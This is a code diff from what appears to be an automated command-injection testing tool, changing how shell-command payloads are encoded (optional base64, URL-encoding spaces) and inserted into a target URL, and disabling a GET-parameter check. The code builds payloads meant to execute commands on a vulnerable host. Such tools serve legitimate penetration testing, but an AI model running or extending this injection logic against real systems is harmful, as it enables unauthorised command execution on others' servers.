@@ -48,7 +48,7 @@ def injection_test(payload, http_request_method, url):
   if http_request_method == "GET":
     
     # Check if its not specified the 'INJECT_HERE' tag
-    url = parameters.do_GET_check(url)
+    #url = parameters.do_GET_check(url)
     
     # Define the vulnerable parameter
     vuln_parameter = parameters.vuln_GET_param(url)
@@ -326,12 +326,20 @@ def injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vul
   
   # Execute shell commands on vulnerable host.
   payload = eb_payloads.cmd_execution(separator, TAG, cmd)
-  payload = re.sub(" ", "%20", payload)
 
   # Fix prefixes / suffixes
   payload = parameters.prefixes(payload, prefix)
   payload = parameters.suffixes(payload, suffix)
-      
+  # Fixation for specific payload.
+  if ")%3B" + urllib.quote(")}") in payload:
+    payload = payload.replace(")%3B" + urllib.quote(")}"), ")" + urllib.quote(")}"))
+
+  if menu.options.base64:
+    payload = urllib.unquote(payload)
+    payload = base64.b64encode(payload)
+  else:
+    payload = re.sub(" ", "%20", payload)
+
   # Check if defined "--verbose" option.
   if menu.options.verbose:
     sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload + Style.RESET_ALL)
@@ -352,7 +360,7 @@ def injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vul
     # Check if defined method is GET (Default).
     if http_request_method == "GET":
       # Check if its not specified the 'INJECT_HERE' tag
-      url = parameters.do_GET_check(url)
+      #url = parameters.do_GET_check(url)
       
       target = re.sub(settings.INJECT_TAG, payload, url)
       vuln_parameter = ''.join(vuln_parameter)
